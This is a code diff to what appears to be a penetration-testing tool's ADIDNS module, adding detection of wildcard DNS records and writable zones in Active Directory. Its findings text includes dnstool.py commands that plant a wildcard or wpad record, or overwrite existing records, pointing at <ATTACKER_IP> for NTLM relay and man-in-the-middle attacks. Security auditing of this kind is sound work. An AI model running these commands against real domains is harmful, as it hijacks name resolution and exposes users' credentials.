@@ -21,6 +21,12 @@ value. Two angles:
 Pure LDAP: zone + node reads, `dnsRecord` parsing (utils.dnsrecord) and DACL
 parsing (reuses modules.acls._parse_dacl). No writes.
 
+Wildcard awareness (v2.14.0): a `*` record answers every unresolved name in a
+zone, so its presence neutralises classic missing-name / wpad injection there but
+makes the `*` itself a domain-wide takeover primitive — a present wildcard is
+reported (and its overwrite flagged CRITICAL), and its absence is surfaced as the
+strongest create-child target (plant a catch-all `*`).
+
 ⚠️ NOT VALIDATED LIVE (v2.12.0): implemented and unit-tested against mocked
    records / synthetic descriptors, but never run against a real DC.
 """
@@ -130,8 +136,12 @@ class ADIDNSModule(BaseModule):
 
         out.counter("DNS zones", len(zones), {"records": len(nodes)})
 
+        wild_nodes = [n for n in nodes if n["name"] == "*"]
+        wild_zones = {n["zone"].lower() for n in wild_nodes}
+
         self._dump_records(ctx, nodes)
-        self._check_zone_create(ctx, zones, nodes)
+        self._report_wildcards(ctx, wild_nodes)
+        self._check_zone_create(ctx, zones, nodes, wild_zones)
         self._check_record_dacls(ctx, nodes)
 
     # ------------------------------------------------------------------ bases
@@ -183,8 +193,40 @@ class ADIDNSModule(BaseModule):
                 + ", ".join(hosts[:20]) + (" …" if len(hosts) > 20 else ""),
             )
 
+    # ----------------------------------------------------------- wildcards
+    @staticmethod
+    def _wild_value(node: dict) -> str:
+        return ", ".join(f"{t} {v}" for (t, v, _s) in node["records"] if t != "ZERO")
+
+    def _report_wildcards(self, ctx: ScanContext, wild_nodes: list) -> None:
+        out = ctx.out
+        out.subsection("Wildcard records (*)")
+        if not wild_nodes:
+            out.info("No '*' wildcard record present "
+                     "(→ a non-priv create-child right lets one be planted; see below)")
+            return
+
+        rows = [[n["zone"], self._wild_value(n) or "-"] for n in wild_nodes]
+        out.table(["Zone", "Wildcard (*) value"], rows, indent=4,
+                  highlight_fn=lambda r: C.YELLOW)
+
+        ctx.quick_wins.add(
+            Severity.MEDIUM,
+            f"ADIDNS — wildcard (*) record present in {len(wild_nodes)} zone(s)",
+            "A '*' record answers every otherwise-unresolved name in the zone. Two "
+            "consequences:\n"
+            "  - it already catches missing-name / wpad queries, so classic ADIDNS "
+            "name-injection is largely neutralised in that zone;\n"
+            "  - whoever can overwrite the '*' controls resolution of ALL unresolved "
+            "names (domain-wide MITM) — cross-check the 'writable records' finding, "
+            "and confirm the current target is expected:\n"
+            + "\n".join(f"  - {n['zone']}: {self._wild_value(n) or '(no data)'}"
+                        for n in wild_nodes),
+        )
+
     # ----------------------------------------------------------- zone spoof
-    def _check_zone_create(self, ctx: ScanContext, zones: dict, nodes: list) -> None:
+    def _check_zone_create(self, ctx: ScanContext, zones: dict, nodes: list,
+                           wild_zones: set) -> None:
         out = ctx.out
         out.subsection("Zone Create-Child (record spoofing)")
         dsid = ctx.domain_sid
@@ -218,17 +260,38 @@ class ADIDNSModule(BaseModule):
 
         for zn, tname, tsid, broad in spoofable:
             sev = Severity.HIGH if broad else Severity.MEDIUM
-            # missing wpad in this zone?
+            is_reverse = zn.endswith(".arpa")
+            has_wild   = zn.lower() in wild_zones
             have = {n["name"].lower() for n in nodes if n["zone"] == zn}
-            wpad = " wpad is ABSENT → add it to coerce WPAD-using clients.\n" \
-                   if ("wpad" not in have and not zn.endswith(".arpa")) else "\n"
+
+            if is_reverse:
+                scope_note = "\n"
+            elif has_wild:
+                # A wildcard already answers unresolved queries, so planting a new
+                # missing-name / wpad record is largely moot — the lever is to
+                # overwrite the existing '*' (see the writable-records finding).
+                scope_note = (
+                    " NOTE: a '*' wildcard already exists in this zone → it answers "
+                    "unresolved queries, so planting a new missing-name / wpad record "
+                    "is largely neutralised; overwriting the existing '*' is the path "
+                    "instead (see 'writable records').\n")
+            else:
+                wpad = ("wpad is ABSENT → add it to coerce WPAD clients. "
+                        if "wpad" not in have else "")
+                scope_note = (
+                    f" {wpad}No '*' wildcard exists → creating one is a DOMAIN-WIDE "
+                    "catch-all for every unresolved name (strongest):\n"
+                    f"  python3 dnstool.py -u '{self._upn(ctx)}' -p '<password>' "
+                    f"--action add --record '*' --data <ATTACKER_IP> --type A "
+                    f"--zone {zn} {ctx.args.dc}\n")
+
             ctx.quick_wins.add(
                 sev,
                 f"ADIDNS spoofing — '{tname}' can create records in zone {zn}",
                 f"The zone DACL grants Create-Child to {tname} ({tsid}), so this "
                 "identity can add arbitrary DNS records → NTLM coercion / relay "
                 "(point a resolved-but-missing name, or wpad, at an attacker host)."
-                + wpad +
+                + scope_note +
                 "  # dirkjanm dnstool.py (impacket):\n"
                 f"  python3 dnstool.py -u '{self._upn(ctx)}' -p '<password>' "
                 f"--action add --record wpad --data <ATTACKER_IP> --type A "
@@ -243,12 +306,13 @@ class ADIDNSModule(BaseModule):
         out.subsection("Writable existing records (hijack)")
         dsid = ctx.domain_sid
 
-        findings = []   # (fqdn, types, trustee, sid)
+        findings = []   # (fqdn, types, trustee, sid, is_wild)
         for n in nodes:
             if not n["sd"]:
                 continue
             types = ",".join(sorted({t for (t, _v, _s) in n["records"]
                                      if t != "ZERO"}))
+            is_wild = n["name"] == "*"
             for ace in _parse_dacl(n["sd"]):
                 sid = ace["sid"]
                 if sid in _SKIP_SIDS or is_privileged_sid(sid, dsid):
@@ -256,25 +320,33 @@ class ADIDNSModule(BaseModule):
                 mask = ace["mask"]
                 if (mask & _WRITE_BITS) or (mask & FULL_CONTROL) == FULL_CONTROL:
                     findings.append((n["fqdn"], types or "-",
-                                     resolve_sid(sid, dsid), sid))
+                                     resolve_sid(sid, dsid), sid, is_wild))
                     break   # one finding per record is enough
 
         if not findings:
             out.success("No existing record is writable by a non-privileged principal")
             return
 
-        rows = [[fqdn, types, tname] for (fqdn, types, tname, _s) in findings]
+        rows = [[("* " + fqdn) if w else fqdn, types, tname]
+                for (fqdn, types, tname, _s, w) in findings]
         out.table(["Record", "Type(s)", "Writable by"], rows, indent=4,
                   highlight_fn=lambda r: C.RED)
 
+        has_wild = any(w for (_f, _t, _n, _s, w) in findings)
         lines = [f"  - {fqdn} ({types}) writable by {tname}"
-                 for (fqdn, types, tname, _s) in findings]
+                 + ("   ⚠ WILDCARD → controls ALL unresolved names in the zone"
+                    if w else "")
+                 for (fqdn, types, tname, _s, w) in findings]
         ctx.quick_wins.add(
-            Severity.HIGH,
-            f"ADIDNS — {len(findings)} existing record(s) writable by non-priv principals",
+            Severity.CRITICAL if has_wild else Severity.HIGH,
+            f"ADIDNS — {len(findings)} existing record(s) writable by non-priv principals"
+            + (" (incl. a WILDCARD)" if has_wild else ""),
             "A non-privileged principal can overwrite these existing DNS records "
             "→ hijack a legitimate name (redirect a server's A record to an "
-            "attacker host for coercion / MITM):\n" + "\n".join(lines) + "\n"
+            "attacker host for coercion / MITM)."
+            + (" A writable '*' wildcard is domain-wide: it hijacks resolution of "
+               "every otherwise-unresolved name at once.\n" if has_wild else "\n")
+            + "\n".join(lines) + "\n"
             "  # overwrite with dnstool.py --action modify:\n"
             f"  python3 dnstool.py -u '{self._upn(ctx)}' -p '<password>' "
             "--action modify --record <name> --data <ATTACKER_IP> --type A "
